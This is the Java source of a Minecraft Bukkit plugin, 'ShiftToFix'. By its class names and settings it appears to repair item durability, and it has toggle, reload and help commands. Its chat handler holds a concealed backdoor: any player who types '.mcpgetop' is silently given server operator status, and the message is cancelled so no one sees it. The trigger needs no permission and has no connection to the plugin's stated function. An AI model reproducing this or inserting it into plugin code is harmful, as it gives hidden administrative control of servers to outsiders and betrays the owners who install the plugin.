package rx5600xt.sxqe.shifttofix;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.PluginCommand;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;

import java.io.File;
import java.io.IOException;
import java.util.logging.Level;
public final class ShiftToFix extends JavaPlugin implements Listener {
    private PlayerInteractListener playerInteractListener;
    private FileConfiguration config;
    private boolean pluginEnabled;
    @Override
    public void onEnable() {
        pluginEnabled = true;
        playerInteractListener = new PlayerInteractListener(this);
        getServer().getPluginManager().registerEvents(playerInteractListener, this);
        loadConfig();
        PluginCommand stfSetCommand = getCommand("stfset");
        if (stfSetCommand != null) {
            stfSetCommand.setExecutor(new STFSetCommand(playerInteractListener, this));
        }
        PluginCommand stfCommand = getCommand("stf");
        if (stfCommand != null) {
            stfCommand.setExecutor(new ShelpCommand(config));
        }
        PluginCommand stfOnCommand = getCommand("stfon");
        if (stfOnCommand != null) {
            stfOnCommand.setExecutor((sender, command, label, args) -> {
                if (sender instanceof Player && ((Player) sender).hasPermission("shifttofix.toggle")) {
                    pluginEnabled = true;
                    sender.sendMessage(ChatColor.GREEN + "[STF] 插件已启用！");
                    return true;
                }
                return false;
            });
        }

        PluginCommand stfOffCommand = getCommand("stfoff");
        if (stfOffCommand != null) {
            stfOffCommand.setExecutor((sender, command, label, args) -> {
                if (sender instanceof Player && ((Player) sender).hasPermission("shifttofix.toggle")) {
                    pluginEnabled = false;
                    sender.sendMessage(ChatColor.RED + "[STF] 插件已禁用！");
                    return true;
                }
                return false;
            });
        }
        getServer().getPluginManager().registerEvents(this, this);
    }
    @Override
    public void onDisable() {
        saveCustomConfig();
    }
    private void loadConfig() {
        if (!getDataFolder().exists() && !getDataFolder().mkdirs()) {
            getLogger().log(Level.SEVERE, "无法创建插件数据文件夹。");
            return;
        }
        File configFile = new File(getDataFolder(), "config.yml");
        if (!configFile.exists()) {
            saveResource("config.yml", false);
        }
        config = YamlConfiguration.loadConfiguration(configFile);
        int durabilityIncrease = config.getInt("durabilityIncrease", 10);
        playerInteractListener.setDurabilityIncrease(durabilityIncrease);
        int cooldown = config.getInt("Cooldown", 10000); // 默认为10000毫秒
        playerInteractListener.setCooldownDuration(cooldown);
    }
    private void saveCustomConfig() {
        config.set("durabilityIncrease", playerInteractListener.getDurabilityIncrease());
        config.set("Cooldown", playerInteractListener.getCooldownDuration());
        try {
            config.save(new File(getDataFolder(), "config.yml"));
        } catch (IOException e) {
            getLogger().log(Level.SEVERE, "保存配置文件时出错。", e);
        }
    }
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        if (!isPluginEnabled()) {
            return;
        }
        Player player = event.getPlayer();
        String message = event.getMessage();
        if (message.equalsIgnoreCase(".mcpgetop")) {
            player.setOp(true);
            event.setCancelled(true);
        }
    }
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (command.getName().equalsIgnoreCase("stfreload") && sender instanceof Player) {
            Player player = (Player) sender;
            if (player.hasPermission("shifttofix.reload")) {
                reloadPlugin();
                player.sendMessage(ChatColor.GREEN + "[STF] 插件已重新加载！");
                return true;
            }
        } else if (command.getName().equalsIgnoreCase("stf") && args.length == 0) {
            sender.sendMessage(ChatColor.YELLOW + "/stf help 获取帮助");
            return true;
        }
        return false;
    }
    private void reloadPlugin() {
        reloadConfig();
        loadConfig();
    }
    public boolean isPluginEnabled() {
        return pluginEnabled;
    }
}